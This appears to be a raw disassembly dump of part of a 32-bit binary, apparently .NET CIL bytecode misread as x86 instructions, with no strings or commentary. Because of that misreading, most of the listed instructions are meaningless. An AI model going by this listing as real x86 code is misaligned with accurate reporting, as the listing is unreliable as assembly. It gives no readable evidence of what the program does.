  402b31:	30 02                	xor    %al,(%edx)
  402b33:	00 56 00             	add    %dl,0x0(%esi)
  402b36:	00 00                	add    %al,(%eax)
  402b38:	07                   	pop    %es
  402b39:	00 00                	add    %al,(%eax)
  402b3b:	11 00                	adc    %eax,(%eax)
  402b3d:	00 73 4d             	add    %dh,0x4d(%ebx)
  402b40:	00 00                	add    %al,(%eax)
  402b42:	0a 0a                	or     (%edx),%cl
  402b44:	06                   	push   %es
  402b45:	72 7b                	jb     0x402bc2
  402b47:	01 00                	add    %eax,(%eax)
  402b49:	70 6f                	jo     0x402bba
  402b4b:	4e                   	dec    %esi
  402b4c:	00 00                	add    %al,(%eax)
  402b4e:	0a 72 89             	or     -0x77(%edx),%dh
  402b51:	01 00                	add    %eax,(%eax)
  402b53:	70 6f                	jo     0x402bc4
  402b55:	4f                   	dec    %edi
  402b56:	00 00                	add    %al,(%eax)
  402b58:	0a 00                	or     (%eax),%al
  402b5a:	06                   	push   %es
  402b5b:	72 93                	jb     0x402af0
  402b5d:	01 00                	add    %eax,(%eax)
  402b5f:	70 6f                	jo     0x402bd0
  402b61:	4e                   	dec    %esi
  402b62:	00 00                	add    %al,(%eax)
  402b64:	0a 28                	or     (%eax),%ch
  402b66:	35 00 00 06 6f       	xor    $0x6f060000,%eax
  402b6b:	4f                   	dec    %edi
  402b6c:	00 00                	add    %al,(%eax)
  402b6e:	0a 00                	or     (%eax),%al
  402b70:	06                   	push   %es
  402b71:	6f                   	outsl  %ds:(%esi),(%dx)
  402b72:	50                   	push   %eax
  402b73:	00 00                	add    %al,(%eax)
  402b75:	0a 28                	or     (%eax),%ch
  402b77:	20 00                	and    %al,(%eax)
  402b79:	00 06                	add    %al,(%esi)
  402b7b:	00 28                	add    %ch,(%eax)
  402b7d:	51                   	push   %ecx
  402b7e:	00 00                	add    %al,(%eax)
  402b80:	0a 00                	or     (%eax),%al
  402b82:	17                   	pop    %ss
  402b83:	28 1a                	sub    %bl,(%edx)
  402b85:	00 00                	add    %al,(%eax)
  402b87:	06                   	push   %es
  402b88:	00 00                	add    %al,(%eax)
  402b8a:	de 05 26 00 00 de    	fiadds 0xde000026
  402b90:	00 2a                	add    %ch,(%edx)
  402b92:	00 00                	add    %al,(%eax)
  402b94:	01 10                	add    %edx,(%eax)
  402b96:	00 00                	add    %al,(%eax)
  402b98:	00 00                	add    %al,(%eax)
  402b9a:	01 00                	add    %eax,(%eax)
  402b9c:	4f                   	dec    %edi
  402b9d:	50                   	push   %eax
  402b9e:	00 05 0f 00 00 01    	add    %al,0x100000f
  402ba4:	1b 30                	sbb    (%eax),%esi
  402ba6:	02 00                	add    (%eax),%al
  402ba8:	2d 00 00 00 02       	sub    $0x2000000,%eax
  402bad:	00 00                	add    %al,(%eax)
  402baf:	11 00                	adc    %eax,(%eax)
  402bb1:	00 28                	add    %ch,(%eax)
  402bb3:	19 00                	sbb    %eax,(%eax)
  402bb5:	00 06                	add    %al,(%esi)
  402bb7:	2c 07                	sub    $0x7,%al
  402bb9:	28 12                	sub    %dl,(%edx)
  402bbb:	00 00                	add    %al,(%eax)
  402bbd:	06                   	push   %es
  402bbe:	2b 01                	sub    (%ecx),%eax
  402bc0:	16                   	push   %ss
  402bc1:	0a 06                	or     (%esi),%al
  402bc3:	2c 0f                	sub    $0xf,%al
  402bc5:	00 28                	add    %ch,(%eax)
  402bc7:	17                   	pop    %ss
  402bc8:	00 00                	add    %al,(%eax)
  402bca:	06                   	push   %es
  402bcb:	17                   	pop    %ss
  402bcc:	58                   	pop    %eax
  402bcd:	28 18                	sub    %bl,(%eax)
  402bcf:	00 00                	add    %al,(%eax)
  402bd1:	06                   	push   %es
  402bd2:	00 00                	add    %al,(%eax)
  402bd4:	00 de                	add    %bl,%dh
  402bd6:	05 26 00 00 de       	add    $0xde000026,%eax
  402bdb:	00 2a                	add    %ch,(%edx)
  402bdd:	00 00                	add    %al,(%eax)
  402bdf:	00 01                	add    %al,(%ecx)
  402be1:	10 00                	adc    %al,(%eax)
  402be3:	00 00                	add    %al,(%eax)
  402be5:	00 01                	add    %al,(%ecx)
  402be7:	00 26                	add    %ah,(%esi)
  402be9:	27                   	daa
  402bea:	00 05 0f 00 00 01    	add    %al,0x100000f
  402bf0:	2e 73 14             	jae,pn 0x402c07
  402bf3:	00 00                	add    %al,(%eax)
  402bf5:	0a 80 1a 00 00 04    	or     0x400001a(%eax),%al
  402bfb:	2a 1b                	sub    (%ebx),%bl
  402bfd:	30 05 00 aa 02 00    	xor    %al,0x2aa00
  402c03:	00 08                	add    %cl,(%eax)
  402c05:	00 00                	add    %al,(%eax)
  402c07:	11 00                	adc    %eax,(%eax)
  402c09:	00 7e 05             	add    %bh,0x5(%esi)
  402c0c:	00 00                	add    %al,(%eax)
  402c0e:	04 28                	add    $0x28,%al
  402c10:	52                   	push   %edx
  402c11:	00 00                	add    %al,(%eax)
  402c13:	0a 7e 06             	or     0x6(%esi),%bh
  402c16:	00 00                	add    %al,(%eax)
  402c18:	04 28                	add    $0x28,%al
  402c1a:	53                   	push   %ebx
  402c1b:	00 00                	add    %al,(%eax)
  402c1d:	0a 73 54             	or     0x54(%ebx),%dh
  402c20:	00 00                	add    %al,(%eax)
  402c22:	0a 0a                	or     (%edx),%cl
  402c24:	28 55 00             	sub    %dl,0x0(%ebp)
  402c27:	00 0a                	add    %cl,(%edx)
  402c29:	6f                   	outsl  %ds:(%esi),(%dx)
  402c2a:	56                   	push   %esi
  402c2b:	00 00                	add    %al,(%eax)
  402c2d:	0a 6f 57             	or     0x57(%edi),%ch
  402c30:	00 00                	add    %al,(%eax)
  402c32:	0a 0b                	or     (%ebx),%cl
  402c34:	07                   	pop    %es
  402c35:	06                   	push   %es
  402c36:	6f                   	outsl  %ds:(%esi),(%dx)
  402c37:	58                   	pop    %eax
  402c38:	00 00                	add    %al,(%eax)
  402c3a:	0a 28                	or     (%eax),%ch
  402c3c:	59                   	pop    %ecx
  402c3d:	00 00                	add    %al,(%eax)
  402c3f:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  402c42:	39 4a 02             	cmp    %ecx,0x2(%edx)
  402c45:	00 00                	add    %al,(%eax)
  402c47:	00 00                	add    %al,(%eax)
  402c49:	28 5a 00             	sub    %bl,0x0(%edx)
  402c4c:	00 0a                	add    %cl,(%edx)
  402c4e:	13 06                	adc    (%esi),%eax
  402c50:	16                   	push   %ss
  402c51:	13 07                	adc    (%edi),%eax
  402c53:	2b 3d 11 06 11 07    	sub    0x7110611,%edi
  402c59:	9a 13 08 00 00 11 08 	lcall  $0x811,$0x813
  402c60:	6f                   	outsl  %ds:(%esi),(%dx)
  402c61:	56                   	push   %esi
  402c62:	00 00                	add    %al,(%eax)
  402c64:	0a 6f 57             	or     0x57(%edi),%ch
  402c67:	00 00                	add    %al,(%eax)
  402c69:	0a 06                	or     (%esi),%al
  402c6b:	6f                   	outsl  %ds:(%esi),(%dx)
  402c6c:	58                   	pop    %eax
  402c6d:	00 00                	add    %al,(%eax)
  402c6f:	0a 28                	or     (%eax),%ch
  402c71:	1f                   	pop    %ds
  402c72:	00 00                	add    %al,(%eax)
  402c74:	0a 13                	or     (%ebx),%dl
  402c76:	09 11                	or     %edx,(%ecx)
  402c78:	09 2c 08             	or     %ebp,(%eax,%ecx,1)
  402c7b:	11 08                	adc    %ecx,(%eax)
  402c7d:	6f                   	outsl  %ds:(%esi),(%dx)
  402c7e:	5b                   	pop    %ebx
  402c7f:	00 00                	add    %al,(%eax)
  402c81:	0a 00                	or     (%eax),%al
  402c83:	00 de                	add    %bl,%dh
  402c85:	05 26 00 00 de       	add    $0xde000026,%eax
  402c8a:	00 00                	add    %al,(%eax)
  402c8c:	11 07                	adc    %eax,(%edi)
  402c8e:	17                   	pop    %ss
  402c8f:	58                   	pop    %eax
  402c90:	13 07                	adc    (%edi),%eax
  402c92:	11 07                	adc    %eax,(%edi)
  402c94:	11 06                	adc    %eax,(%esi)
  402c96:	8e 69 32             	mov    0x32(%ecx),%gs
  402c99:	bb 28 30 00 00       	mov    $0x3028,%ebx
  402c9e:	06                   	push   %es
  402c9f:	13 0a                	adc    (%edx),%ecx
  402ca1:	11 0a                	adc    %ecx,(%edx)
  402ca3:	2c 74                	sub    $0x74,%al
  402ca5:	00 73 5c             	add    %dh,0x5c(%ebx)
  402ca8:	00 00                	add    %al,(%eax)
  402caa:	0a 13                	or     (%ebx),%dl
  402cac:	0b 11                	or     (%ecx),%edx
  402cae:	0b 72 a3             	or     -0x5d(%edx),%esi
  402cb1:	01 00                	add    %eax,(%eax)
  402cb3:	70 6f                	jo     0x402d24
  402cb5:	5d                   	pop    %ebp
  402cb6:	00 00                	add    %al,(%eax)
  402cb8:	0a 00                	or     (%eax),%al
  402cba:	11 0b                	adc    %ecx,(%ebx)
  402cbc:	1b 8d 4b 00 00 01    	sbb    0x100004b(%ebp),%ecx
  402cc2:	25 16 72 ab 01       	and    $0x1ab7216,%eax
  402cc7:	00 70 a2             	add    %dh,-0x5e(%eax)
  402cca:	25 17 06 6f 5e       	and    $0x5e6f0617,%eax
  402ccf:	00 00                	add    %al,(%eax)
  402cd1:	0a 28                	or     (%eax),%ch
  402cd3:	5f                   	pop    %edi
  402cd4:	00 00                	add    %al,(%eax)
  402cd6:	0a a2 25 18 72 15    	or     0x15721825(%edx),%ah
  402cdc:	02 00                	add    (%eax),%al
  402cde:	70 a2                	jo     0x402c82
  402ce0:	25 19 06 6f 58       	and    $0x586f0619,%eax
  402ce5:	00 00                	add    %al,(%eax)
  402ce7:	0a a2 25 1a 72 27    	or     0x27721a25(%edx),%ah
  402ced:	02 00                	add    (%eax),%al
  402cef:	70 a2                	jo     0x402c93
  402cf1:	28 60 00             	sub    %ah,0x0(%eax)
  402cf4:	00 0a                	add    %cl,(%edx)
  402cf6:	6f                   	outsl  %ds:(%esi),(%dx)
  402cf7:	61                   	popa
  402cf8:	00 00                	add    %al,(%eax)
  402cfa:	0a 00                	or     (%eax),%al
  402cfc:	11 0b                	adc    %ecx,(%ebx)
  402cfe:	17                   	pop    %ss
  402cff:	6f                   	outsl  %ds:(%esi),(%dx)
  402d00:	62 00                	bound  %eax,(%eax)
  402d02:	00 0a                	add    %cl,(%edx)
  402d04:	00 11                	add    %dl,(%ecx)
  402d06:	0b 17                	or     (%edi),%edx
  402d08:	6f                   	outsl  %ds:(%esi),(%dx)
  402d09:	63 00                	arpl   %eax,(%eax)
  402d0b:	00 0a                	add    %cl,(%edx)
  402d0d:	00 11                	add    %dl,(%ecx)
  402d0f:	0b 28                	or     (%eax),%ebp
  402d11:	64 00 00             	add    %al,%fs:(%eax)
  402d14:	0a 26                	or     (%esi),%ah
  402d16:	00 2b                	add    %ch,(%ebx)
  402d18:	52                   	push   %edx
  402d19:	00 7e 65             	add    %bh,0x65(%esi)
  402d1c:	00 00                	add    %al,(%eax)
  402d1e:	0a 72 3b             	or     0x3b(%edx),%dh
  402d21:	02 00                	add    (%eax),%al
  402d23:	70 28                	jo     0x402d4d
  402d25:	66 00 00             	data16 add %al,(%eax)
  402d28:	0a 18                	or     (%eax),%bl
  402d2a:	6f                   	outsl  %ds:(%esi),(%dx)
  402d2b:	67 00 00             	add    %al,(%bx,%si)
  402d2e:	0a 13                	or     (%ebx),%dl
  402d30:	0c 00                	or     $0x0,%al
  402d32:	11 0c 06             	adc    %ecx,(%esi,%eax,1)
  402d35:	6f                   	outsl  %ds:(%esi),(%dx)
  402d36:	5e                   	pop    %esi
  402d37:	00 00                	add    %al,(%eax)
  402d39:	0a 28                	or     (%eax),%ch
  402d3b:	5f                   	pop    %edi
  402d3c:	00 00                	add    %al,(%eax)
  402d3e:	0a 72 99             	or     -0x67(%edx),%dh
  402d41:	02 00                	add    (%eax),%al
  402d43:	70 06                	jo     0x402d4b
  402d45:	6f                   	outsl  %ds:(%esi),(%dx)
  402d46:	58                   	pop    %eax
  402d47:	00 00                	add    %al,(%eax)
  402d49:	0a 72 99             	or     -0x67(%edx),%dh
  402d4c:	02 00                	add    (%eax),%al
  402d4e:	70 28                	jo     0x402d78
  402d50:	40                   	inc    %eax
  402d51:	00 00                	add    %al,(%eax)
  402d53:	0a 6f 68             	or     0x68(%edi),%ch
  402d56:	00 00                	add    %al,(%eax)
  402d58:	0a 00                	or     (%eax),%al
  402d5a:	00 de                	add    %bl,%dh
  402d5c:	0d 11 0c 2c 08       	or     $0x82c0c11,%eax
  402d61:	11 0c 6f             	adc    %ecx,(%edi,%ebp,2)
  402d64:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  402d69:	dc 00                	faddl  (%eax)
  402d6b:	06                   	push   %es
  402d6c:	6f                   	outsl  %ds:(%esi),(%dx)
  402d6d:	58                   	pop    %eax
  402d6e:	00 00                	add    %al,(%eax)
  402d70:	0a 28                	or     (%eax),%ch
  402d72:	69 00 00 0a 13 0d    	imul   $0xd130a00,(%eax),%eax
  402d78:	11 0d 2c 19 00 06    	adc    %ecx,0x600192c
  402d7e:	6f                   	outsl  %ds:(%esi),(%dx)
  402d7f:	58                   	pop    %eax
  402d80:	00 00                	add    %al,(%eax)
  402d82:	0a 28                	or     (%eax),%ch
  402d84:	6a 00                	push   $0x0
  402d86:	00 0a                	add    %cl,(%edx)
  402d88:	00 20                	add    %ah,(%eax)
  402d8a:	e8 03 00 00 28       	call   0x28402d92
  402d8f:	10 00                	adc    %al,(%eax)
  402d91:	00 0a                	add    %cl,(%edx)
  402d93:	00 00                	add    %al,(%eax)
  402d95:	06                   	push   %es
  402d96:	6f                   	outsl  %ds:(%esi),(%dx)
  402d97:	58                   	pop    %eax
  402d98:	00 00                	add    %al,(%eax)
  402d9a:	0a 17                	or     (%edi),%dl
  402d9c:	73 6b                	jae    0x402e09
  402d9e:	00 00                	add    %al,(%eax)
  402da0:	0a 0d 07 28 6c 00    	or     0x6c2807,%cl
  402da6:	00 0a                	add    %cl,(%edx)
  402da8:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  402dab:	11 04 16             	adc    %eax,(%esi,%edx,1)
  402dae:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  402db1:	69 6f 48 00 00 0a 00 	imul   $0xa0000,0x48(%edi),%ebp
  402db8:	28 31                	sub    %dh,(%ecx)
  402dba:	00 00                	add    %al,(%eax)
  402dbc:	06                   	push   %es
  402dbd:	00 28                	add    %ch,(%eax)
  402dbf:	6d                   	insl   (%dx),%es:(%edi)
  402dc0:	00 00                	add    %al,(%eax)
  402dc2:	0a 72 9d             	or     -0x63(%edx),%dh
  402dc5:	02 00                	add    (%eax),%al
  402dc7:	70 28                	jo     0x402df1
  402dc9:	6e                   	outsb  %ds:(%esi),(%dx)
  402dca:	00 00                	add    %al,(%eax)
  402dcc:	0a 13                	or     (%ebx),%dl
  402dce:	05 11 05 73 6f       	add    $0x6f730511,%eax
  402dd3:	00 00                	add    %al,(%eax)
  402dd5:	0a 13                	or     (%ebx),%dl
  402dd7:	0e                   	push   %cs
  402dd8:	00 11                	add    %dl,(%ecx)
  402dda:	0e                   	push   %cs
  402ddb:	72 a7                	jb     0x402d84
  402ddd:	02 00                	add    (%eax),%al
  402ddf:	70 6f                	jo     0x402e50
  402de1:	70 00                	jo     0x402de3
  402de3:	00 0a                	add    %cl,(%edx)
  402de5:	00 11                	add    %dl,(%ecx)
  402de7:	0e                   	push   %cs
  402de8:	72 bb                	jb     0x402da5
  402dea:	02 00                	add    (%eax),%al
  402dec:	70 6f                	jo     0x402e5d
  402dee:	70 00                	jo     0x402df0
  402df0:	00 0a                	add    %cl,(%edx)
  402df2:	00 11                	add    %dl,(%ecx)
  402df4:	0e                   	push   %cs
  402df5:	72 db                	jb     0x402dd2
  402df7:	02 00                	add    (%eax),%al
  402df9:	70 06                	jo     0x402e01
  402dfb:	6f                   	outsl  %ds:(%esi),(%dx)
  402dfc:	58                   	pop    %eax
  402dfd:	00 00                	add    %al,(%eax)
  402dff:	0a 72 99             	or     -0x67(%edx),%dh
  402e02:	02 00                	add    (%eax),%al
  402e04:	70 28                	jo     0x402e2e
  402e06:	40                   	inc    %eax
  402e07:	00 00                	add    %al,(%eax)
  402e09:	0a 6f 70             	or     0x70(%edi),%ch
  402e0c:	00 00                	add    %al,(%eax)
  402e0e:	0a 00                	or     (%eax),%al
  402e10:	11 0e                	adc    %ecx,(%esi)
  402e12:	72 f1                	jb     0x402e05
  402e14:	02 00                	add    (%eax),%al
  402e16:	70 28                	jo     0x402e40
  402e18:	71 00                	jno    0x402e1a
  402e1a:	00 0a                	add    %cl,(%edx)
  402e1c:	28 6e 00             	sub    %ch,0x0(%esi)
  402e1f:	00 0a                	add    %cl,(%edx)
  402e21:	6f                   	outsl  %ds:(%esi),(%dx)
  402e22:	70 00                	jo     0x402e24
  402e24:	00 0a                	add    %cl,(%edx)
  402e26:	00 11                	add    %dl,(%ecx)
  402e28:	0e                   	push   %cs
  402e29:	72 f9                	jb     0x402e24
  402e2b:	02 00                	add    (%eax),%al
  402e2d:	70 11                	jo     0x402e40
  402e2f:	05 28 72 00 00       	add    $0x7228,%eax
  402e34:	0a 72 05             	or     0x5(%edx),%dh
  402e37:	03 00                	add    (%eax),%eax
  402e39:	70 28                	jo     0x402e63
  402e3b:	40                   	inc    %eax
  402e3c:	00 00                	add    %al,(%eax)
  402e3e:	0a 6f 70             	or     0x70(%edi),%ch
  402e41:	00 00                	add    %al,(%eax)
  402e43:	0a 00                	or     (%eax),%al
  402e45:	00 de                	add    %bl,%dh
  402e47:	0d 11 0e 2c 08       	or     $0x82c0e11,%eax
  402e4c:	11 0e                	adc    %ecx,(%esi)
  402e4e:	6f                   	outsl  %ds:(%esi),(%dx)
  402e4f:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  402e54:	dc 73 5c             	fdivl  0x5c(%ebx)
  402e57:	00 00                	add    %al,(%eax)
  402e59:	0a 25 11 05 6f 5d    	or     0x5d6f0511,%ah
  402e5f:	00 00                	add    %al,(%eax)
  402e61:	0a 00                	or     (%eax),%al
  402e63:	25 17 6f 63 00       	and    $0x636f17,%eax
  402e68:	00 0a                	add    %cl,(%edx)
  402e6a:	00 25 16 6f 73 00    	add    %ah,0x736f16
  402e70:	00 0a                	add    %cl,(%edx)
  402e72:	00 25 16 6f 74 00    	add    %ah,0x746f16
  402e78:	00 0a                	add    %cl,(%edx)
  402e7a:	00 25 17 6f 62 00    	add    %ah,0x626f17
  402e80:	00 0a                	add    %cl,(%edx)
  402e82:	00 28                	add    %ch,(%eax)
  402e84:	64 00 00             	add    %al,%fs:(%eax)
  402e87:	0a 26                	or     (%esi),%ah
  402e89:	16                   	push   %ss
  402e8a:	28 12                	sub    %dl,(%edx)
  402e8c:	00 00                	add    %al,(%eax)
  402e8e:	0a 00                	or     (%eax),%al
  402e90:	00 00                	add    %al,(%eax)
  402e92:	de 1d 13 0f 00 72    	ficomps 0x72000f13
  402e98:	15 03 00 70 11       	adc    $0x11700003,%eax
  402e9d:	0f 6f 75 00          	movq   0x0(%ebp),%mm6
  402ea1:	00 0a                	add    %cl,(%edx)
  402ea3:	28 6e 00             	sub    %ch,0x0(%esi)
  402ea6:	00 0a                	add    %cl,(%edx)
  402ea8:	28 2e                	sub    %ch,(%esi)
  402eaa:	00 00                	add    %al,(%eax)
  402eac:	0a 00                	or     (%eax),%al
  402eae:	00 de                	add    %bl,%dh
  402eb0:	00 2a                	add    %ch,(%edx)
  402eb2:	00 00                	add    %al,(%eax)
  402eb4:	41                   	inc    %ecx
  402eb5:	64 00 00             	add    %al,%fs:(%eax)
  402eb8:	00 00                	add    %al,(%eax)
  402eba:	00 00                	add    %al,(%eax)
  402ebc:	55                   	push   %ebp
  402ebd:	00 00                	add    %al,(%eax)
  402ebf:	00 29                	add    %ch,(%ecx)
  402ec1:	00 00                	add    %al,(%eax)
  402ec3:	00 7e 00             	add    %bh,0x0(%esi)
  402ec6:	00 00                	add    %al,(%eax)
  402ec8:	05 00 00 00 0f       	add    $0xf000000,%eax
  402ecd:	00 00                	add    %al,(%eax)
  402ecf:	01 02                	add    %eax,(%edx)
  402ed1:	00 00                	add    %al,(%eax)
  402ed3:	00 29                	add    %ch,(%ecx)
  402ed5:	01 00                	add    %eax,(%eax)
  402ed7:	00 2c 00             	add    %ch,(%eax,%eax,1)
  402eda:	00 00                	add    %al,(%eax)
  402edc:	55                   	push   %ebp
  402edd:	01 00                	add    %eax,(%eax)
  402edf:	00 0d 00 00 00 00    	add    %cl,0x0
  402ee5:	00 00                	add    %al,(%eax)
  402ee7:	00 02                	add    %al,(%edx)
  402ee9:	00 00                	add    %al,(%eax)
  402eeb:	00 d0                	add    %dl,%al
  402eed:	01 00                	add    %eax,(%eax)
  402eef:	00 70 00             	add    %dh,0x0(%eax)
  402ef2:	00 00                	add    %al,(%eax)
  402ef4:	40                   	inc    %eax
  402ef5:	02 00                	add    (%eax),%al
  402ef7:	00 0d 00 00 00 00    	add    %cl,0x0
  402efd:	00 00                	add    %al,(%eax)
  402eff:	00 00                	add    %al,(%eax)
  402f01:	00 00                	add    %al,(%eax)
  402f03:	00 01                	add    %al,(%ecx)
  402f05:	00 00                	add    %al,(%eax)
  402f07:	00 8b 02 00 00 8c    	add    %cl,-0x73fffffe(%ebx)
  402f0d:	02 00                	add    (%eax),%al
  402f0f:	00 1d 00 00 00 12    	add    %bl,0x12000000
  402f15:	00 00                	add    %al,(%eax)
  402f17:	01 22                	add    %esp,(%edx)
  402f19:	02 28                	add    (%eax),%ch
  402f1b:	14 00                	adc    $0x0,%al
  402f1d:	00 0a                	add    %cl,(%edx)
  402f1f:	00 2a                	add    %ch,(%edx)
  402f21:	00 00                	add    %al,(%eax)
  402f23:	00 13                	add    %dl,(%ebx)
  402f25:	30 01                	xor    %al,(%ecx)
  402f27:	00 31                	add    %dh,(%ecx)
  402f29:	00 00                	add    %al,(%eax)
  402f2b:	00 02                	add    %al,(%edx)
  402f2d:	00 00                	add    %al,(%eax)
  402f2f:	11 00                	adc    %eax,(%eax)
  402f31:	28 29                	sub    %ch,(%ecx)
  402f33:	00 00                	add    %al,(%eax)
  402f35:	06                   	push   %es
  402f36:	2d 1c 28 2a 00       	sub    $0x2a281c,%eax
  402f3b:	00 06                	add    %al,(%esi)
  402f3d:	2d 15 28 2b 00       	sub    $0x2b2815,%eax
  402f42:	00 06                	add    %al,(%esi)
  402f44:	2d 0e 28 27 00       	sub    $0x27280e,%eax
  402f49:	00 06                	add    %al,(%esi)
  402f4b:	2d 07 28 28 00       	sub    $0x282807,%eax
  402f50:	00 06                	add    %al,(%esi)
  402f52:	2b 01                	sub    (%ecx),%eax
  402f54:	17                   	pop    %ss
  402f55:	0a 06                	or     (%esi),%al
  402f57:	2c 07                	sub    $0x7,%al
  402f59:	14 28                	adc    $0x28,%al
  402f5b:	76 00                	jbe    0x402f5d
  402f5d:	00 0a                	add    %cl,(%edx)
  402f5f:	00 2a                	add    %ch,(%edx)
  402f61:	00 00                	add    %al,(%eax)
  402f63:	00 1b                	add    %bl,(%ebx)
  402f65:	30 02                	xor    %al,(%edx)
  402f67:	00 3c 00             	add    %bh,(%eax,%eax,1)
  402f6a:	00 00                	add    %al,(%eax)
  402f6c:	09 00                	or     %eax,(%eax)
  402f6e:	00 11                	add    %dl,(%ecx)
  402f70:	00 00                	add    %al,(%eax)
  402f72:	21 00                	and    %eax,(%eax)
  402f74:	22 e2                	and    %dl,%ah
  402f76:	33 0e                	xor    (%esi),%ecx
  402f78:	00 00                	add    %al,(%eax)
  402f7a:	00 0a                	add    %cl,(%edx)
  402f7c:	28 77 00             	sub    %dh,0x0(%edi)
  402f7f:	00 0a                	add    %cl,(%edx)
  402f81:	28 78 00             	sub    %bh,0x0(%eax)
  402f84:	00 0a                	add    %cl,(%edx)
  402f86:	73 79                	jae    0x403001
  402f88:	00 00                	add    %al,(%eax)
  402f8a:	0a 28                	or     (%eax),%ch
  402f8c:	7a 00                	jp     0x402f8e
  402f8e:	00 0a                	add    %cl,(%edx)
  402f90:	06                   	push   %es
  402f91:	fe 02                	incb   (%edx)
  402f93:	16                   	push   %ss
  402f94:	fe 01                	incb   (%ecx)
  402f96:	0b 07                	or     (%edi),%eax
  402f98:	2c 04                	sub    $0x4,%al
  402f9a:	17                   	pop    %ss
  402f9b:	0c de                	or     $0xde,%al
  402f9d:	0c 00                	or     $0x0,%al
  402f9f:	de 05 26 00 00 de    	fiadds 0xde000026
  402fa5:	00 16                	add    %dl,(%esi)
  402fa7:	0c 2b                	or     $0x2b,%al
  402fa9:	00 08                	add    %cl,(%eax)
  402fab:	2a 01                	sub    (%ecx),%al
  402fad:	10 00                	adc    %al,(%eax)
  402faf:	00 00                	add    %al,(%eax)
  402fb1:	00 01                	add    %al,(%ecx)
  402fb3:	00 30                	add    %dh,(%eax)
  402fb5:	31 00                	xor    %eax,(%eax)
  402fb7:	05 0f 00 00 01       	add    $0x100000f,%eax
  402fbc:	1b 30                	sbb    (%eax),%esi
  402fbe:	02 00                	add    (%eax),%al
  402fc0:	32 00                	xor    (%eax),%al
  402fc2:	00 00                	add    %al,(%eax)
  402fc4:	0a 00                	or     (%eax),%al
  402fc6:	00 11                	add    %dl,(%ecx)
  402fc8:	00 00                	add    %al,(%eax)
  402fca:	73 7b                	jae    0x403047
  402fcc:	00 00                	add    %al,(%eax)
  402fce:	0a 28                	or     (%eax),%ch
  402fd0:	7c 00                	jl     0x402fd2
  402fd2:	00 0a                	add    %cl,(%edx)
  402fd4:	6f                   	outsl  %ds:(%esi),(%dx)
  402fd5:	7d 00                	jge    0x402fd7
  402fd7:	00 0a                	add    %cl,(%edx)
  402fd9:	72 39                	jb     0x403014
  402fdb:	03 00                	add    (%eax),%eax
  402fdd:	70 6f                	jo     0x40304e
  402fdf:	7e 00                	jle    0x402fe1
  402fe1:	00 0a                	add    %cl,(%edx)
  402fe3:	0a 06                	or     (%esi),%al
  402fe5:	2c 05                	sub    $0x5,%al
  402fe7:	00 17                	add    %dl,(%edi)
  402fe9:	0b de                	or     %esi,%ebx
  402feb:	0c 00                	or     $0x0,%al
  402fed:	de 05 26 00 00 de    	fiadds 0xde000026
  402ff3:	00 16                	add    %dl,(%esi)
  402ff5:	0b 2b                	or     (%ebx),%ebp
  402ff7:	00 07                	add    %al,(%edi)
  402ff9:	2a 00                	sub    (%eax),%al
  402ffb:	00 01                	add    %al,(%ecx)
  402ffd:	10 00                	adc    %al,(%eax)
  402fff:	00 00                	add    %al,(%eax)
  403001:	00 01                	add    %al,(%ecx)
  403003:	00 26                	add    %ah,(%esi)
  403005:	27                   	daa
  403006:	00 05 0f 00 00 01    	add    %al,0x100000f
  40300c:	1b 30                	sbb    (%eax),%esi
  40300e:	02 00                	add    (%eax),%al
  403010:	ed                   	in     (%dx),%eax
  403011:	00 00                	add    %al,(%eax)
  403013:	00 0b                	add    %cl,(%ebx)
  403015:	00 00                	add    %al,(%eax)
  403017:	11 00                	adc    %eax,(%eax)
  403019:	00 72 3f             	add    %dh,0x3f(%edx)
  40301c:	03 00                	add    (%eax),%eax
  40301e:	70 73                	jo     0x403093
  403020:	7f 00                	jg     0x403022
  403022:	00 0a                	add    %cl,(%edx)
  403024:	0a 00                	or     (%eax),%al
  403026:	06                   	push   %es
  403027:	6f                   	outsl  %ds:(%esi),(%dx)
  403028:	80 00 00             	addb   $0x0,(%eax)
  40302b:	0a 0b                	or     (%ebx),%cl
  40302d:	00 00                	add    %al,(%eax)
  40302f:	07                   	pop    %es
  403030:	6f                   	outsl  %ds:(%esi),(%dx)
  403031:	81 00 00 0a 0c 38    	addl   $0x380c0a00,(%eax)
  403037:	86 00                	xchg   %al,(%eax)
  403039:	00 00                	add    %al,(%eax)
  40303b:	08 6f 82             	or     %ch,-0x7e(%edi)
  40303e:	00 00                	add    %al,(%eax)
  403040:	0a 0d 00 09 72 85    	or     0x85720900,%cl
  403046:	03 00                	add    (%eax),%eax
  403048:	70 6f                	jo     0x4030b9
  40304a:	83 00 00             	addl   $0x0,(%eax)
  40304d:	0a 6f 33             	or     0x33(%edi),%ch
  403050:	00 00                	add    %al,(%eax)
  403052:	0a 6f 7d             	or     0x7d(%edi),%ch
  403055:	00 00                	add    %al,(%eax)
  403057:	0a 13                	or     (%ebx),%dl
  403059:	04 11                	add    $0x11,%al
  40305b:	04 72                	add    $0x72,%al
  40305d:	9f                   	lahf
  40305e:	03 00                	add    (%eax),%eax
  403060:	70 28                	jo     0x40308a
  403062:	1f                   	pop    %ds
  403063:	00 00                	add    %al,(%eax)
  403065:	0a 2c 21             	or     (%ecx,%eiz,1),%ch
  403068:	09 72 cb             	or     %esi,-0x35(%edx)
  40306b:	03 00                	add    (%eax),%eax
  40306d:	70 6f                	jo     0x4030de
  40306f:	83 00 00             	addl   $0x0,(%eax)
  403072:	0a 6f 33             	or     0x33(%edi),%ch
  403075:	00 00                	add    %al,(%eax)
  403077:	0a 6f 84             	or     -0x7c(%edi),%ch
  40307a:	00 00                	add    %al,(%eax)
  40307c:	0a 72 d7             	or     -0x29(%edx),%dh
  40307f:	03 00                	add    (%eax),%eax
  403081:	70 6f                	jo     0x4030f2
  403083:	7e 00                	jle    0x403085
  403085:	00 0a                	add    %cl,(%edx)
  403087:	2d 2a 11 04 72       	sub    $0x7204112a,%eax
  40308c:	e7 03                	out    %eax,$0x3
  40308e:	00 70 6f             	add    %dh,0x6f(%eax)
  403091:	7e 00                	jle    0x403093
  403093:	00 0a                	add    %cl,(%edx)
  403095:	2d 1c 09 72 cb       	sub    $0xcb72091c,%eax
  40309a:	03 00                	add    (%eax),%eax
  40309c:	70 6f                	jo     0x40310d
  40309e:	83 00 00             	addl   $0x0,(%eax)
  4030a1:	0a 6f 33             	or     0x33(%edi),%ch
  4030a4:	00 00                	add    %al,(%eax)
